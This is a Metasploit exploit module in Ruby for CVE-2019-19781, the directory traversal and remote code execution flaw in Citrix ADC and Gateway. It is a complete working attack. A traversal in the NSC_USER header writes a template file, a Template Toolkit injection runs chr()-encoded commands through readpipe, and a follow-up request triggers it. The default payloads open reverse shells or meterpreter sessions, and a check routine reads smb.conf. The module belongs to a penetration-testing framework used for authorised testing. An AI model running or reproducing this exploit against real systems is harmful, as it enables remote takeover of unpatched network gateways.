##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Citrix ADC Remote Code Execution',
      'Description' => %q(
        An issue was discovered in Citrix Application Delivery Controller (ADC)
        and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.
      ),
      'Author' => [
        'Project Zero India', 'TrustedSec', # proof of concept.
        'mekhalleh (RAMELLA Sébastien)'     # this module. (https://www.pirates.re/)
      ],
      'References' => [
        ['CVE', '2019-19781'],
        ['URL', 'https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/'],
        ['EDB', '47901'],
        ['EDB', '47902']
      ],
      'DisclosureDate' => '2019-12-17',
      'License' => MSF_LICENSE,
      'Platform' => ['unix', 'python'],
      'Arch' => [ARCH_CMD, ARCH_PYTHON],
      'Privileged' => true,
      'Targets' => [
        ['Python (meterpreter)',
          'Type' => :python,
          'DefaultOptions' => {
            'PAYLOAD' => 'python/meterpreter/reverse_tcp',
            'DisablePayloadHandler' => 'false'
          }
        ],
        ['Unix (remote shell)',
          'Type' => :cmd_shell,
          'Payload' => {
            'Compat' => {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'perl'
            }
          },
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/unix/reverse_perl',
            'DisablePayloadHandler' => 'false'
          }
        ],
        ['Unix (command-line)',
          'Type' => :cmd_generic,
          'Payload' => {
            'Compat' => {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic'
            }
          },
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/unix/generic',
            'DisablePayloadHandler' => 'true'
          }
        ],
      ],
      'DefaultTarget' => 0,
      'DefaultOptions' => {
        'RPORT' => 443,
        'SSL'   => true
      },
      'Notes' => {
        'AKA' => ['Shitrix'],
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptAddress.new('RHOST', [true, 'The target address'])
    ])

    register_advanced_options([
      OptBool.new('ForceExploit', [false, 'Override check result', false])
    ])

    deregister_options('RHOSTS')
  end

  def execute_command(command, opts = {})
    filename = Rex::Text.rand_text_alpha(16)
    nonce = Rex::Text.rand_text_alpha(6)

    request  = {
      'method' => 'POST',
      'uri' => normalize_uri('vpn', '..', 'vpns', 'portal', 'scripts', 'newbm.pl'),
      'headers' => {
        'NSC_USER' => '../../../netscaler/portal/templates/' + filename,
        'NSC_NONCE' => nonce
      },
      'vars_post' => {
        'url' => 'http://127.0.0.1',
        'title' => "[% template.new({'BLOCK'='print readpipe(#{get_chr_payload(command)})'})%]",
        'desc' => 'desc',
        'UI_inuse' => 'RfWeb'
      },
      'encode_params' => false
    }

    begin
      received = send_request_cgi(request)
    rescue ::OpenSSL::SSL::SSLError, ::Errno::ENOTCONN
      print_error('Unable to connect on the remote target.')
    end
    return false unless received

    if received.code == 200
      vprint_status("#{received.get_html_document.text}")
      sleep 2

      request = {
        'method' => 'GET',
        'uri' => normalize_uri('vpn', '..', 'vpns', 'portal', filename + '.xml'),
        'headers' => {
          'NSC_USER' => nonce,
          'NSC_NONCE' => nonce
        }
      }

      ## Trigger to gain exploitation.
      begin
        if target['Type'].to_s.include? 'generic'
          send_request_cgi(request)
        else
          register_file_for_cleanup '/var/tmp/netscaler/portal/templates/' + filename + '.xml.ttc2'
          register_file_for_cleanup '/netscaler/portal/templates/' + filename + '.xml'
        end
        received = send_request_cgi(request)
      rescue ::OpenSSL::SSL::SSLError, ::Errno::ENOTCONN
        print_error('Unable to connect on the remote target.')
      end
      return false unless received
      return received
    end

    return false
  end

  def get_chr_payload(command)
    chr_payload = command
    i = chr_payload.length

    output = ""
    chr_payload.each_char do | c |
      i = i - 1
      output << "chr(" << c.ord.to_s << ")"
      if i != 0
        output << " . "
      end
    end

    return output
  end

  def check
    begin
      received = send_request_cgi(
        "method" => "GET",
        "uri" => normalize_uri('vpn', '..', 'vpns', 'cfg', 'smb.conf')
      )
    rescue ::OpenSSL::SSL::SSLError, ::Errno::ENOTCONN
      print_error('Unable to connect on the remote target.')
    end

    if received && received.code != 200
      return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    unless check.eql? Exploit::CheckCode::Vulnerable
      unless datastore['ForceExploit']
        fail_with(Failure::NotVulnerable, 'The target is not exploitable.')
      end
    else
        print_good('The target appears to be vulnerable.')
    end

    case target['Type']
    when :cmd_generic
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      received = execute_command(payload.encoded)
      if (received) && (datastore['PAYLOAD'] == "cmd/unix/generic")
        print_warning('Dumping command output in parsed http response')
        print_good("#{received.get_html_document.text}")
      else
        print_warning('Empty response, no command output')
        return
      end

    when :cmd_shell
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      execute_command(payload.encoded)
    when :python
      print_status("Sending #{datastore['PAYLOAD']} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      execute_command("/var/python/bin/python2 -c \"#{payload.encoded}\"")
    end
  end

end